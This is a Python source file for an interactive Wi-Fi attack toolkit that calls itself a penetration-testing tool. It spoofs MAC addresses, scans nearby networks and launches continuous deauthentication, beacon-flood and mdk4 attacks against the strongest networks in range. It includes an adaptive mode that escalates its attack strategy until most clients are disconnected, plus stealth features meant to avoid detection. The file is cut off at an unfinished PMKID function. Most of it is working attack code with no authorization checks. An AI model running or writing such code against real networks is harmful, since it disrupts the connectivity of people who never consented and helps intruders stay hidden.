import os
import sys
import subprocess
import time
import re
import csv
import shutil
import random
import threading
import glob
import shutil
from datetime import datetime
try:
    from msvcrt import getch
except ImportError:
    import termios
    import tty
    def getch():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            return sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

from evilTwin import EvilTwin
from limiter_tool import EvilLimiterRunner

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class ResourceMonitor:
    """Monitors system and network resource usage."""
    def __init__(self):
        self.prev_net_stats = None
        self.prev_time = None

    def get_interface_stats(self, interface):
        """Get network interface statistics."""
        try:
            with open(f"/sys/class/net/{interface}/statistics/tx_bytes") as f:
                tx_bytes = int(f.read())
            with open(f"/sys/class/net/{interface}/statistics/rx_bytes") as f:
                rx_bytes = int(f.read())
            current_time = time.time()
            
            if self.prev_net_stats and self.prev_time:
                time_delta = current_time - self.prev_time
                tx_rate = (tx_bytes - self.prev_net_stats[0]) / time_delta
                rx_rate = (rx_bytes - self.prev_net_stats[1]) / time_delta
            else:
                tx_rate = rx_rate = 0
                
            self.prev_net_stats = (tx_bytes, rx_bytes)
            self.prev_time = current_time
            return {'tx_rate': tx_rate, 'rx_rate': rx_rate}
        except:
            return {'tx_rate': 0, 'rx_rate': 0}

    def get_cpu_usage(self):
        """Get CPU usage percentage."""
        try:
            return os.getloadavg()[0] * 100 / os.cpu_count()
        except:
            return 0

    def get_memory_usage(self):
        """Get memory usage percentage."""
        try:
            with open('/proc/meminfo') as f:
                meminfo = dict((i.split()[0].rstrip(':'), int(i.split()[1]))
                             for i in f.readlines())
            total = meminfo['MemTotal']
            available = meminfo['MemAvailable']
            return ((total - available) / total) * 100
        except:
            return 0

class AdaptiveController:
    """Controls packet rates based on network conditions."""
    def __init__(self, base_rate=250):
        self.base_rate = base_rate
        self.current_rate = base_rate
        self.min_rate = 50
        self.max_rate = 1000
        self.adjustment_factor = 1.2

    def adjust_rate(self, cpu_usage, memory_usage, network_load):
        """Adjust packet rate based on system metrics."""
        if cpu_usage > 80 or memory_usage > 80 or network_load > 80:
            self.current_rate = max(self.min_rate, 
                                  self.current_rate / self.adjustment_factor)
        # Increase rate if resources are available
        elif cpu_usage < 50 and memory_usage < 50 and network_load < 50:
            self.current_rate = min(self.max_rate, 
                                  self.current_rate * self.adjustment_factor)
        return int(self.current_rate)

class AttackStrategy:
    """Manages different attack combinations and strategies."""
    def __init__(self):
        self.strategies = {
            'aggressive': {
                'description': 'Maximum disruption, high resource usage',
                'attacks': ['beacon', 'deauth', 'michael'],
                'packet_rate': 500
            },
            'stealthy': {
                'description': 'Lower detection risk, moderate disruption',
                'attacks': ['deauth', 'michael'],
                'packet_rate': 100
            },
            'targeted': {
                'description': 'Focus on specific devices/networks',
                'attacks': ['deauth'],
                'packet_rate': 250
            }
        }
        self.current_strategy = 'stealthy'
        self.success_threshold = 70
        self.strategy_duration = 30

    def get_strategy(self, name=None):
        """Get a specific strategy or current strategy."""
        return self.strategies[name or self.current_strategy]

    def evaluate_effectiveness(self, disconnection_rate):
        """Evaluate current strategy effectiveness."""
        return disconnection_rate >= self.success_threshold

    def select_next_strategy(self, current_effectiveness):
        """Select next strategy based on effectiveness."""
        if current_effectiveness < self.success_threshold:
            if self.current_strategy == 'stealthy':
                self.current_strategy = 'aggressive'
            elif self.current_strategy == 'aggressive':
                self.current_strategy = 'targeted'
            else:
                self.current_strategy = 'stealthy'
        return self.get_strategy()

class WifiToolkit:
    """
    A Python port of the wifi-toolkit.sh script for Wi-Fi penetration testing.
    """

    @staticmethod
    def strip_ansi(text):
        """Remove ANSI color codes for length calculations"""
        ansi_pattern = re.compile(r'\x1b\[[0-9;]*m')
        return ansi_pattern.sub('', text)

    def _assess_vulnerability(self, ap_info, client_count):
        """Assesses the vulnerability of an AP and returns a label and priority."""
        privacy = ap_info.get('privacy', '').upper()
        essid = ap_info.get('essid', '')

        if 'WEP' in privacy:
            return f"{RED}[HIGHLY VULNERABLE]{NC}", 1
        elif 'WPA3' in privacy:
            return f"{BLUE}[SECURE]{NC}", 4
        elif 'WPA' in privacy:
            if client_count > 0:
                return f"{GREEN}[POTENTIAL TARGET]{NC}", 3
            else:
                return f"{YELLOW}[WPA/WPA2]{NC}", 5
        return "", 99

    def __init__(self):
        self.interface = None
        self.original_mac = ""
        self.new_mac = ""
        self.logfile = f"/tmp/wifi-toolkit-{os.getpid()}.log"
        self.report_dir = os.path.expanduser("~/.wifi-toolkit_logs")
        self.session_start_time = datetime.now()
        self.scan_prefix = f"/tmp/wifi_scan_{os.getpid()}_{int(time.time())}"
        self.stealth_mode = False
        self.mac_rotation_interval = 30
        self.channel_hop_interval = 5
        self.last_mac_rotation = 0
        self.last_channel_hop = 0
        self.current_tx_power = 20
        self.stealth_thread = None
        self.active_processes = []
        self.stealth_mode_ever_enabled = False
        self.evil_twin_instance = None

    def _animated_loading(self, message, duration=1):
        """Shows an animated loading message."""
        frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        colors = [RED, YELLOW, GREEN, BLUE]
        start_time = time.time()
        
        try:
            term_width = os.get_terminal_size().columns
        except:
            term_width = 80
            
        while time.time() - start_time < duration:
            for i, frame in enumerate(frames):
                color = colors[i % len(colors)]
                print(f"\r{' ' * term_width}\r{color}{frame}{NC} {message}...", end="", flush=True)
                time.sleep(0.1)
        print()

    def _log(self, level, message):
        """Writes a message to the internal log file."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.logfile, "a") as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")

    def _run_command(self, command, shell=False, quiet=False):
        """Executes a shell command."""
        try:
            if quiet:
                return subprocess.run(command, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                return subprocess.run(command, shell=shell, check=True)
        except FileNotFoundError:
            print(f"{RED}Error: Command not found: {command[0]}{NC}")
            self._log("ERROR", f"Command not found: {command[0]}")
            return None
        except subprocess.CalledProcessError as e:
            if not quiet:
                if e.returncode != -2: # -2 is often SIGINT
                    print(f"{RED}Error executing command: {' '.join(command)}{NC}")
                    if e.stderr:
                        print(f"Stderr: {e.stderr.strip()}")
            self._log("ERROR", f"Command failed: {' '.join(command)} - {e.stderr}")
            return None
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{NC}")
            self._log("ERROR", f"An unexpected error occurred with command {' '.join(command)}: {e}")
            return None

    def _print_header(self):
        """Prints a cleaner, simplified script header."""
        os.system('clear')
        art = f"""
{YELLOW}__        _________        _____  _  ______  _____ _____ ___  _  __{NC}
{YELLOW}\\ \      / / ____\\ \      / / _ \| |/ /  _ \| ____|_   _/ _ \| |/ /{NC}
{YELLOW} \\ \ /\\ / /|  _|  \\ \ /\\ / / | | | ' /| | | |  _|   | || | | | ' / {NC}
{YELLOW}  \\ V  V / | |___  \\ V  V /| |_| | . \\| |_| | |___  | || |_| | . \\ {NC}
{YELLOW}   \\_/\\_/  |_____|  \\_/\\_/  \\___/|_|\\_\\____/|_____| |_| \\___/|_|\\_\\{NC}
"""
        print(art)
        title = "WIFI-TOOL By dla v2.9.4 (this tool is free if someone sells it, scammer!)"
        print(f"{BLUE}{'=' * 70}{NC}")
        print(f"{YELLOW}{title.center(70)}{NC}")
        print(f"{BLUE}{'=' * 70}{NC}\n")
    def check_dependencies(self):
        """Checks if all required and optional command-line tools are installed."""
        self._animated_loading("Checking system dependencies", 1.5)
        
        required_deps = ["airmon-ng", "airodump-ng", "aireplay-ng", "mdk4", "macchanger", "iw"]
        optional_deps = {"Evil Twin Attack": ["hostapd", "dnsmasq"]}

        missing_required = [dep for dep in required_deps if not shutil.which(dep)]

        if missing_required:
            print(f"{RED}Missing required tools: {', '.join(missing_required)}{NC}")
            print(f"{YELLOW}Please install them (e.g., sudo apt install aircrack-ng mdk4 macchanger iw hostapd dnsmasq){NC}")
            sys.exit(1)
        
        all_found = True
        for feature, deps in optional_deps.items():
            missing_optional = [dep for dep in deps if not shutil.which(dep)]
            if missing_optional:
                all_found = False
                print(f"{YELLOW}[!] Warning: Missing optional tools for {feature}: {', '.join(missing_optional)}{NC}")
                print(f"{YELLOW}    The '{feature}' feature will not be available.{NC}")

        if all_found:
            print(f"{GREEN}[✔] All dependencies found.{NC}")
        else:
            print(f"{GREEN}[✔] All required dependencies found. Some features may be limited.{NC}")

        self._log("INFO", "Dependency check complete.")

    def select_interface(self):
        """Detects and allows user to select a wireless interface."""
        print(f"{YELLOW}[*] Detecting wireless interfaces...{NC}")
        interfaces = []
        try:
            for iface in os.listdir('/sys/class/net'):
                phy_path = f'/sys/class/net/{iface}/phy80211/name'
                if os.path.exists(phy_path):
                    with open(phy_path, 'r') as f:
                        phy = f.read().strip()
                    result = self._run_command(['iw', 'phy', phy, 'info'], quiet=True)
                    if result and 'monitor' in result.stdout:
                        interfaces.append(iface)
        except Exception as e:
            print(f"{RED}Error detecting interfaces: {e}{NC}")
            self._log("ERROR", f"Failed to detect interfaces: {e}")
            sys.exit(1)

        if not interfaces:
            print(f"{RED}No wireless interfaces with monitor mode support found. Aborting.{NC}")
            sys.exit(1)

        print("Please select the interface to use:")
        for i, iface in enumerate(interfaces):
            print(f"  {i + 1}) {iface}")
        print(f"  {len(interfaces) + 1}) Cancel")

        print("\nPress key to select interface [1-{}]:".format(len(interfaces) + 1), end='', flush=True)
        while True:
            choice = getch()
            if isinstance(choice, bytes):
                choice = choice.decode('utf-8')
            try:
                choice = int(choice) - 1
                if 0 <= choice < len(interfaces):
                    self.interface = interfaces[choice]
                    print(f"\n{GREEN}You selected:{NC} {YELLOW}{self.interface}{NC}")
                    self._log("INFO", f"Interface selected: {self.interface}")
                    time.sleep(1)
                    return
                elif choice == len(interfaces):
                    print("\nOperation cancelled.")
                    sys.exit(0)
                else:
                    print(f"\n{RED}Invalid option. Please try again.{NC}")
            except ValueError:
                print(f"\n{RED}Invalid input. Please enter a number.{NC}")

    def spoof_mac(self):
        """Handles the MAC address spoofing process."""
        print(f"{YELLOW}[?] Do you want to spoof your MAC address? (y/n): {NC}", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes):
            choice = choice.decode('utf-8')
        choice = choice.lower()
        if choice != 'y':
            return

        try:
            with open(f'/sys/class/net/{self.interface}/address', 'r') as f:
                self.original_mac = f.read().strip()
            if not re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', self.original_mac):
                raise IOError("Invalid MAC format")
        except Exception:
            res = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
            match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', res.stdout if res else "")
            if match:
                self.original_mac = match.group(1)
            else:
                print(f"{RED}Error: Could not get valid MAC address for {self.interface}{NC}")
                self._log("ERROR", f"Failed to get original MAC for {self.interface}")
                sys.exit(1)
        
        self._log("INFO", f"Original MAC: {self.original_mac}")

        print("[ ] Changing MAC address...")
        self._run_command(['ip', 'link', 'set', self.interface, 'down'], quiet=True)
        
        for attempt in range(1, 4):
            print(f"[ ] Attempt {attempt} to change MAC...")
            self._run_command(['macchanger', '-p', self.interface], quiet=True)
            time.sleep(1)
            res = self._run_command(['macchanger', '-r', self.interface], quiet=True)
            if res and "New MAC" in res.stdout:
                time.sleep(1)
                res_ip = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
                match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', res_ip.stdout if res_ip else "")
                if match:
                    self.new_mac = match.group(1)
                    if self.new_mac != self.original_mac:
                        print(f"[{GREEN}✔{NC}] MAC changed from {YELLOW}{self.original_mac}{NC} to {GREEN}{self.new_mac}{NC}")
                        self._log("INFO", f"MAC spoofed from {self.original_mac} to {self.new_mac}")
                        self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
                        return
        
        print(f"{RED}Failed to change MAC address after 3 attempts.{NC}")
        self._log("ERROR", "Failed to spoof MAC after 3 attempts")
        self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
        sys.exit(1)

    def set_monitor_mode(self):
        """Enables monitor mode on the selected interface."""
        print(f"{YELLOW}[*] Preparing to start monitor mode on {self.interface}...{NC}")
        print("[ ] Killing interfering processes...")
        self._run_command(['airmon-ng', 'check', 'kill'], quiet=True)
        print(f"[{GREEN}✔{NC}] Processes killed.")
        print("[ ] Enabling monitor mode...")
        self._run_command(['ip', 'link', 'set', self.interface, 'down'], quiet=True)
        self._run_command(['iw', 'dev', self.interface, 'set', 'type', 'monitor'], quiet=True)
        self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
        
        res = self._run_command(['iwconfig', self.interface], quiet=True)
        if res and "Mode:Monitor" in res.stdout.replace(" ", ""):
            print(f"[{GREEN}✔{NC}] {YELLOW}{self.interface}{NC} is now in monitor mode.")
            self._log("INFO", f"Monitor mode enabled on {self.interface}")
        else:
            print(f"{RED}[!] Failed to enable monitor mode. Aborting.{NC}")
            self._log("ERROR", "Failed to enable monitor mode.")
            sys.exit(1)
        time.sleep(2)

    def run_airodump_scan(self):
        """Runs a network scan using airodump-ng."""
        if not self._ensure_monitor_mode():
            return
        self._print_header()
        print(f"{YELLOW}[?] Select airodump-ng mode:{NC}")
        print("  1) Standard Scan (display only)")
        print("  2) Scan and Save (writes capture files)")
        print("  3) Back to Main Menu")
        print("\nPress key to select mode [1-3]:", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes):
            choice = choice.decode('utf-8')

        cmd = ['airodump-ng', self.interface]
        if choice == '1':
            print("[*] Starting standard scan. Press Ctrl+C to stop.")
        elif choice == '2':
            filename = input("Enter the base filename for capture files: ").strip()
            if not filename:
                filename = "capture"
            print(f"[*] Starting scan. Capture files will be prefixed with '{YELLOW}{filename}{NC}'.")
            cmd.extend(['--write', filename])
        elif choice == '3':
            return
        else:
            print(f"{RED}Invalid option. Returning to menu.{NC}")
            time.sleep(2)
            return
        
        try:
            self._run_command(cmd)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Scan stopped. Returning to main menu...{NC}")
            time.sleep(2)

    def run_dos_attack(self):
        """Execute DoS attack menu using getch() for consistent UI."""
        if not self._ensure_monitor_mode():
            return
        while True:
            self._print_header()
            print(f"{YELLOW}=== DoS Attack Menu ==={NC}")
            print("  [1] WiFi Jamming Attack")
            print("  [2] PMKID Attack")
            print("  [3] Deauthentication Attack")
            print("  [4] Beacon Flood Attack")
            print(f"  [{GREEN}5{NC}] Smart Adaptive Attack")
            print("  [6] Back to Main Menu")
            
            print(f"\n{YELLOW}Press key to select option [1-6]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes): choice = choice.decode('utf-8')
            print(choice)

            if choice == '6':
                break
            
            if choice == '5':
                self._combined_dos_attack(channel=None, duration=-1)
                continue

            if choice not in ['1', '2', '3', '4']:
                print(f"\n{RED}Invalid choice. Please try again.{NC}")
                time.sleep(1)
                continue

            channel = -1
            while channel == -1:
                print(f"\n{YELLOW}Enter target channel (1-14, or 0 for all):{NC} ", end='')
                try:
                    channel_input = input().strip()
                    if not channel_input: continue
                    channel = int(channel_input)
                    if not (0 <= channel <= 14):
                        print(f"{RED}Invalid channel. Must be between 0 and 14.{NC}")
                        channel = -1
                        time.sleep(2)
                    else:
                        self._log("INFO", f"Selected channel: {channel}")
                except ValueError:
                    print(f"{RED}Invalid input. Please enter a number.{NC}")
                    self._log("ERROR", "Invalid channel input")
                    time.sleep(2)

            duration = None
            while duration is None:
                self._print_header()
                print(f"{YELLOW}Attack Duration:{NC}")
                print("  [1] 30 seconds")
                print("  [2] 1 minute")
                print("  [3] 5 minutes")
                print("  [4] Custom duration")
                print("  [5] Unlimited (Ctrl+C to stop)")
                
                print(f"\n{YELLOW}Press key to select duration [1-5]:{NC} ", end='', flush=True)
                duration_choice = getch()
                if isinstance(duration_choice, bytes): duration_choice = duration_choice.decode('utf-8')
                print(duration_choice)

                if duration_choice == '1': duration = 30
                elif duration_choice == '2': duration = 60
                elif duration_choice == '3': duration = 300
                elif duration_choice == '4':
                    while True:
                        print(f"\n{YELLOW}Enter custom duration in seconds:{NC} ", end='')
                        try:
                            custom_duration_str = input().strip()
                            if not custom_duration_str: continue
                            custom_duration = int(custom_duration_str)
                            if custom_duration <= 0:
                                print(f"{RED}Duration must be positive.{NC}")
                                continue
                            duration = custom_duration
                            break
                        except ValueError:
                            print(f"{RED}Invalid input. Please enter a number.{NC}")
                elif duration_choice == '5':
                    duration = -1
                else:
                    print(f"{RED}Invalid choice. Please try again.{NC}")
                    time.sleep(1)

            self._log("INFO", f"Attack duration set to: {duration}")

            try:
                attack_map = {
                    '1': ("WiFi Jamming Attack", self._wifi_jamming_attack),
                    '2': ("PMKID Attack", self._pmkid_attack),
                    '3': ("Deauthentication Attack", self._deauth_attack),
                    '4': ("Beacon Flood Attack", self._beacon_flood_attack),
                }
                attack_name, attack_func = attack_map[choice]
                print(f"\n{GREEN}Starting {attack_name}...{NC}")
                attack_func(channel, duration)
                self._log("INFO", f"{attack_name} completed successfully")
                print(f"\n{GREEN}Attack completed. Press any key to continue...{NC}")
                getch()
            except Exception as e:
                self._log("ERROR", f"Attack failed: {str(e)}")
                print(f"\n{RED}Attack failed: {str(e)}{NC}")
                time.sleep(2)

    def _combined_dos_attack(self, channel, duration, packet_rate=250):
        """Executes a smart, adaptive, and targeted DoS attack."""
        if not self._ensure_monitor_mode():
            return
        self._print_header()
        print(f"{YELLOW}[*] Initializing Smart Adaptive Attack...{NC}")

        print(f"{YELLOW}[*] Scanning for targets for 15 seconds to build a target list...{NC}")
        scan_prefix = f"/tmp/smart_attack_scan_{os.getpid()}"
        scan_cmd = ['airodump-ng', '--write', scan_prefix, '--output-format', 'csv', '--band', 'abg', self.interface]
        scan_proc = None
        try:
            scan_proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(scan_proc)
            for i in range(15):
                print(f"\r{YELLOW}[*] Scanning... {i+1}/15s{NC}", end="", flush=True)
                time.sleep(1)
        finally:
            if scan_proc:
                if scan_proc.poll() is None: scan_proc.terminate()
                if scan_proc in self.active_processes: self.active_processes.remove(scan_proc)

        print(f"\n{GREEN}[✔] Scan complete. Analyzing targets...{NC}")
        csv_file = f"{scan_prefix}-01.csv"
        if not os.path.exists(csv_file):
            print(f"{RED}[!] Scan failed. No initial targets found.{NC}"); return

        aps, clients, ap_client_map = [], [], {}
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                reader = csv.reader(f)
                in_client_section = False
                for row in reader:
                    if not row: continue
                    row = [field.strip() for field in row]
                    if 'BSSID' in row[0]: in_client_section = False; continue
                    if 'Station MAC' in row[0]: in_client_section = True; continue
                    
                    if not in_client_section and len(row) > 13:
                        aps.append({'bssid': row[0], 'channel': row[3], 'privacy': row[5], 'power': row[8], 'essid': row[13]})
                        ap_client_map[row[0]] = []
                    elif in_client_section and len(row) > 5 and row[5] in ap_client_map:
                        ap_client_map[row[5]].append(row[0])
        finally:
            for f in glob.glob(f"{scan_prefix}*"): os.remove(f)

        targets = [ap for ap in aps if ap_client_map.get(ap['bssid'])]
        if not targets:
            print(f"{RED}[!] No networks with active clients found. Smart attack requires clients to measure effectiveness.{NC}")
            time.sleep(4); return

        assessed_targets = []
        for ap in targets:
            client_list = ap_client_map.get(ap['bssid'], [])
            client_count = len(client_list)
            label, priority = self._assess_vulnerability(ap, client_count)
            assessed_targets.append({'ap': ap, 'label': label, 'priority': priority, 'client_count': client_count})
        
        assessed_targets.sort(key=lambda x: x['priority'])

        target_ap = None
        while not target_ap:
            self._print_header()
            print(f"{GREEN}[✔] Found {len(assessed_targets)} networks with active clients.{NC}")
            max_essid_len = max(len(self.strip_ansi(item['ap']['essid'])) for item in assessed_targets) if assessed_targets else 0
            max_label_len = max(len(self.strip_ansi(item['label'])) for item in assessed_targets) if assessed_targets else 0

            min_essid_col_width = 15
            min_vuln_col_width = 20
            essid_col_width = max(max_essid_len, min_essid_col_width)
            vuln_col_width = max(max_label_len, min_vuln_col_width)

            print(f"\n{BLUE}---[ SELECT TARGET FOR SMART ADAPTIVE ATTACK ]---{NC}")
            print(f"{ '[NO]':<5} {'BSSID':<18} {'CH':<4} {'CLIENTS':<8} {'ESSID':<{essid_col_width}} {'VULNERABILITY':<{vuln_col_width}}")
            print("=" * (5 + 18 + 4 + 8 + 8 + essid_col_width + 1 + vuln_col_width))

            for i, item in enumerate(assessed_targets):
                ap = item['ap']
                label = item['label']
                
                print(f"[{i+1:<3}] {ap['bssid']:<18} {ap['channel']:<4} {item['client_count'] :<8} {ap['essid']:<{essid_col_width}} {label:<{vuln_col_width}}")
            print("[q] Back to Main Menu")
            
            print(f"\n{YELLOW}Select a target [1-{len(assessed_targets)}/q]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes): choice = choice.decode('utf-8')
            print(choice)
            if choice.lower() == 'q': return
            try: target_ap = assessed_targets[int(choice) - 1]['ap']
            except (ValueError, IndexError): print(f"{RED}Invalid selection.{NC}"); time.sleep(1)

        initial_clients = ap_client_map[target_ap['bssid']]
        print(f"{GREEN}[✔] Targeting {target_ap['essid']} with {len(initial_clients)} client(s).{NC}")

        monitor_prefix = f"/tmp/smart_monitor_{os.getpid()}"
        monitor_cmd = ['airodump-ng', '--bssid', target_ap['bssid'], '--channel', target_ap['channel'], '--write', monitor_prefix, '--output-format', 'csv', self.interface]
        monitor_proc, attack_proc = None, None
        
        strategy = AttackStrategy()
        strategy.current_strategy = 'stealthy'

        try:
            print(f"{YELLOW}[*] Starting background monitor...{NC}")
            monitor_proc = subprocess.Popen(monitor_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(monitor_proc)
            
            last_strategy_change_time = time.time()
            start_time = time.time()
            
            while time.time() - start_time < duration if duration > 0 else True:
                if not attack_proc or attack_proc.poll() is not None:
                    current_config = strategy.get_strategy()
                    attack_type = random.choice(current_config['attacks'])
                    print(f"\n{YELLOW}[*] Launching strategy '{strategy.current_strategy}' with attack mode '{attack_type}'...{NC}")
                    if attack_proc and attack_proc in self.active_processes: self.active_processes.remove(attack_proc)
                    
                    if attack_type == 'deauth':
                        attack_cmd = ['aireplay-ng', '--deauth', '0', '-a', target_ap['bssid'], self.interface]
                    else:
                        attack_cmd = ['mdk4', self.interface, attack_type[0], '-c', target_ap['channel']]
                    
                    attack_proc = subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.active_processes.append(attack_proc)
                    last_strategy_change_time = time.time()

                # Evaluate effectiveness
                time.sleep(5)
                effectiveness = 0
                monitor_csv = f"{monitor_prefix}-01.csv"
                if os.path.exists(monitor_csv):
                    current_clients = set()
                    with open(monitor_csv, 'r', errors='ignore') as f:
                        reader = csv.reader(f)
                        in_client_section = False
                        for row in reader:
                            if not row: continue
                            if 'Station MAC' in row[0]: in_client_section = True; continue
                            if in_client_section and len(row) > 1 and row[1].strip() == target_ap['bssid']:
                                current_clients.add(row[0].strip())
                    
                    disconnected_clients = [c for c in initial_clients if c not in current_clients]
                    if initial_clients:
                        effectiveness = (len(disconnected_clients) / len(initial_clients)) * 100

                print(f"\r{YELLOW}[*] Current Strategy: {strategy.current_strategy} | Effectiveness: {effectiveness:.1f}%{NC}", end='')
                
                # Check if we need to switch strategy
                if time.time() - last_strategy_change_time > strategy.strategy_duration:
                    if effectiveness < strategy.success_threshold:
                        print(f"\n{RED}[!] Strategy '{strategy.current_strategy}' is not effective. Escalating...{NC}")
                        strategy.select_next_strategy(effectiveness)
                        if attack_proc.poll() is None: attack_proc.terminate() # Kill old process to start a new one
                    else:
                        print(f"\n{GREEN}[✔] Strategy '{strategy.current_strategy}' is effective. Maintaining pressure.{NC}")
                        last_strategy_change_time = time.time() # Reset timer
            
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Attack interrupted by user.{NC}")
        finally:
            print(f"\n{YELLOW}[*] Cleaning up all attack and monitoring processes...{NC}")
            if attack_proc and attack_proc.poll() is None:
                attack_proc.terminate()
                if attack_proc in self.active_processes: self.active_processes.remove(attack_proc)
            if monitor_proc and monitor_proc.poll() is None:
                monitor_proc.terminate()
                if monitor_proc in self.active_processes: self.active_processes.remove(monitor_proc)
            for f in glob.glob(f"{monitor_prefix}*"): os.remove(f)
            print(f"{GREEN}[✔] Smart attack finished.{NC}")
            time.sleep(2)
        
    def _smart_dos_attack(self, channel, duration):
        """Executes an intelligent DoS attack that adapts to the target network."""
        print(f"\n{RED}[!] Initializing Smart DoS Attack...")
        print(f"[!] Analyzing target network...{NC}")
        
        airodump_cmd = [
            'airodump-ng', '--write', self.scan_prefix, 
            '--output-format', 'csv', '--band', 'abg',
            self.interface
        ]
        if channel > 0:
            airodump_cmd.extend(['--channel', str(channel)])
        
        proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.active_processes.append(proc)
        try:
            time.sleep(10)
        finally:
            if proc.poll() is None:
                proc.terminate()
            if proc in self.active_processes:
                self.active_processes.remove(proc)

        csv_file = f"{self.scan_prefix}-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file, 'r', errors='ignore') as f:
                data = f.read()
                
                client_count = data.count(',')
                base_rate = 250
                packet_rate = min(base_rate * (client_count + 1), 1000)
                
                wpa_network = 'WPA' in data
                
                if wpa_network:
                    print(f"{YELLOW}[*] WPA/WPA2 network detected - Focusing on EAPOL and Auth attacks{NC}")
                    self._combined_dos_attack(channel, duration, packet_rate)
                else:
                    print(f"{YELLOW}[*] Open or WEP network detected - Using standard attack pattern{NC}")
                    self._wifi_jamming_attack(channel, duration)
        else:
            print(f"{RED}[!] Could not analyze network - Falling back to combined attack{NC}")
            self._combined_dos_attack(channel, duration, 250)

    def _wifi_jamming_attack(self, channel, duration):
        """Executes a WiFi jamming attack on specified channel."""
        try:
            print(f"\n{YELLOW}[*] Starting network scan to find jamming targets (10 seconds)...{NC}")
            
            scan_file = f"/tmp/jam_scan_{os.getpid()}"
            scan_cmd = ['airodump-ng', '--write', scan_file, '--output-format', 'csv', '--band', 'abg']
            if channel > 0:
                scan_cmd.extend(['--channel', str(channel)])
            scan_cmd.append(self.interface)
            
            scan_proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(scan_proc)
            try:
                for i in range(10):
                    print(f"\r{YELLOW}[*] Scanning: {'▓' * (i+1)}{'░' * (9-i)} {(i+1)*10}%{NC}", end='', flush=True)
                    time.sleep(1)
            finally:
                if scan_proc.poll() is None:
                    scan_proc.terminate()
                if scan_proc in self.active_processes:
                    self.active_processes.remove(scan_proc)
            print()
            
            targets = []
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    reader = csv.reader(f)
                    in_ap_section = False
                    for row in reader:
                        if not row: continue
                        row = [field.strip() for field in row]
                        if 'BSSID' in row[0]: in_ap_section = True; continue
                        if 'Station MAC' in row[0]: break
                        if in_ap_section and len(row) > 13:
                            bssid, essid, ch, power = row[0], row[13], row[3], row[8]
                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid) and essid:
                                if power.replace('-', '').isdigit() and int(power) > -90:
                                    targets.append({'bssid': bssid, 'channel': ch, 'essid': essid, 'power': power})

            if not targets:
                print(f"{RED}[!] No suitable networks found to jam.{NC}")
                time.sleep(3)
                return
                
            targets.sort(key=lambda x: int(x['power']), reverse=True)
            
            jam_targets = targets[:5]

            print(f"\n{GREEN}[✔] Found {len(jam_targets)} networks to jam (Top 5):{NC}")
            print(f"\n{'BSSID':<18} {'CH':<4} {'PWR':<6} {'ESSID'}")
            print("="*50)
            for t in jam_targets:
                print(f"{t['bssid']:<18} {t['channel']:<4} {t['power']:<6} {t['essid']}")
            
            print(f"\n{GREEN}[*] Starting WiFi jamming attack...{NC}")
            if duration > 0:
                print(f"[*] Duration: {duration} seconds{NC}")
            else:
                print(f"[*] Duration: Unlimited (Press Ctrl+C to stop){NC}")

            self._log("INFO", f"Starting multi-BSSID deauth attack on {len(jam_targets)} targets.")
            
            jamming_procs = []
            try:
                for target in jam_targets:
                    print(f"{GREEN}[*] Attacking {target['essid']} ({target['bssid']}){NC}")
                    cmd = ['aireplay-ng', '--deauth', '0', '-a', target['bssid'], self.interface]
                    
                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.active_processes.append(proc)
                    jamming_procs.append(proc)
                
                print(f"\n{YELLOW}[*] All attack processes launched.{NC}")
                if duration > 0:
                    print(f"{YELLOW}[*] Running timed attack for {duration} seconds...{NC}")
                    time.sleep(duration)
                else:
                    print(f"{YELLOW}[*] Running continuous attack (Press Ctrl+C to stop)...{NC}")
                    while True:
                        time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{YELLOW}Attack interrupted by user.{NC}")
            finally:
                print(f"\n{YELLOW}[*] Stopping all jamming processes...{NC}")
                for proc in jamming_procs:
                    if proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
                print(f"\n{GREEN}[✔] Jamming attack completed.{NC}")
            
            for f in glob.glob(f"{scan_file}*"):
                try: os.remove(f)
                except: pass
                
        except Exception as e:
            print(f"{RED}Error during jamming attack: {str(e)}{NC}")
            self._log("ERROR", f"Jamming attack failed: {str(e)}")
            time.sleep(2)

    def _pmkid_attack(self, channel, duration):
